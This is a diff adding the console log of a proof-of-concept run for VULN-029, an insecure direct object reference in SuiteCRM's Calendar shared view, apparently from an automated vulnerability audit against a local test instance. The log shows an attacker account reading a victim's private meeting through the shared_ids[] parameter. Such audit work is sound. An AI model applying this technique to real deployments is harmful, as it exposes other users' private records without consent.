@@ -1,0 +1,18 @@
+<frozen site>:107: RuntimeWarning: Unexpected value in sys.prefix, expected /opt/cvehunter/claude_audit/SuiteCRM/exploits/.venv, got /opt/cvehunter/claude_audit/SuiteCRM/exploits/VULN-029/../.venv
+<frozen site>:107: RuntimeWarning: Unexpected value in sys.exec_prefix, expected /opt/cvehunter/claude_audit/SuiteCRM/exploits/.venv, got /opt/cvehunter/claude_audit/SuiteCRM/exploits/VULN-029/../.venv
+========================================================================
+VULN-029: Calendar shared view reads any user's Meetings (IDOR)
+target: http://localhost:33116
+========================================================================
+[SETUP] admin web login; provisioning victim (V) and attacker (A)
+[INFO] victim   = mod_e557ec7e (4d14ce66-cd55-4e95-93c6-d27f356381d7)
+[INFO] attacker = mod_1c11de9c (9978165c-c600-4e7f-afc9-b5f71b3e9d18) -- V never shared her calendar with A
+[SETUP] as V: create a private Meeting for today (app-container clock), 24h time format (default_time_format=H:i)
+[INFO] scheduling meeting for 09/28/2026 10:00 (UTC 'today', within Calendar's -5/+1 day query window)
+[OK] Meeting created: 3f967741-fa3e-43a4-a990-cbd2869e6a86 name='V029Meeting_0d24d197' description='SECRETDESC029_3b9d2c16', assigned_user=V
+[STEP] as A: request the shared calendar view for V's user id (A was never given access)
+[PROOF] response status=200 len=146106
+[PROOF] victim meeting name 'V029Meeting_0d24d197' present in attacker's shared-view response: True
+[PROOF] victim meeting description 'SECRETDESC029_3b9d2c16' present in attacker's shared-view response: True
+[OK] attacker received victim's private Meeting subject + description with zero sharing consent
+==> VULN-029: CONFIRMED — attacker read V's Meeting ('V029Meeting_0d24d197' / 'SECRETDESC029_3b9d2c16') via Calendar shared_ids[] with no consent check
